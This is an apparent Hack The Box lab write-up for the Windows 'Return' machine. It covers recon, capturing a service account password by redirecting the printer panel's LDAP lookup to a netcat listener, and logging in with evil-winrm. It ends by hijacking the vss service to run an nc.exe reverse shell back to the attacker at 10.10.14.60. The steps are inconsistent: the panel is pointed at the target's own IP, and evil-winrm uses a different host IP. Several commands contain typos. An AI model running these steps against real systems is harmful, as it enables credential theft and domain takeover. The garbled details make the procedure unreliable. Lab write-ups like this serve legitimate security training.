# Hack The Box - Return

## Ininital info gathering

### Nmap scan

> nmap -sC -sV 10.10.11.108

> PORT     STATE SERVICE       VERSION
> 53/tcp   open  domain        Simple DNS Plus
> 80/tcp   open  http          Microsoft IIS httpd 10.0
> | http-methods: 
> |_  Potentially risky methods: TRACE
> |_http-server-header: Microsoft-IIS/10.0
> |_http-title: HTB Printer Admin Panel
> 88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-02-09 00:59:53Z)
> 135/tcp  open  msrpc         Microsoft Windows RPC
> 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
> 389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return. local0., Site: Default-First-Site-Name)
> 445/tcp  open  microsoft-ds?
> 464/tcp  open  kpasswd5?
> 593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
> 636/tcp  open  tcpwrapped
> 3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
> 3269/tcp open  tcpwrapped
> Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

> Host script results:
> |_clock-skew: 18m36s
> | smb2-security-mode: 
> |   2.02: 
> |_    Message signing enabled and required
> | smb2-time: 
> |   date: 2022-02-09T01:00:11
> |_  start_date: N/A

### Enumeration with enum4linux

> Domain Name: RETURN
> Domain Sid: S-1-5-21-3750359090-2939318659-876128439
> [+] Host is part of a domain (not a workgroup)

## The hack

### Setup netcat listner on ldap port 389

> nc -lvnp 389

### Change the server address on settings page

"On Settings page of http://10.10.11.108 change Server Address to 10.10.11.108 and hit update"

#### Output

> 1edFg43012!!

### Run evil-winrm on Port 5985 WinRm

> evil-winrm -i 10.10.10.233 -u svc-printer -p '1edFg43012!!'

## Privilege escalation

### Admin accounts

> net localgroup administrators

"Shows, "Administrator" and "Domain Admins" and "Enterprise Admins"

### Run commands to try and gain foothold

> net user return\svc-printer P@ssword123!

"Access denied..."

### View user permissions

> net user svc-printer

"Able to stop and stop services. Also a part of Domain Users."

### Upload service binary to obtain reverse shell

#### While on PS session with svc-printer user account

> upload /usr/share/windows-resources/binaries/nc.exe

> sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.60 1234"

### Throw up a netcat listner on your machine

> nc- lvnp 1234

#### Stop and start the vvs service on the PS session

> net stop vss
> net start vss

# Boom you got an admin shell
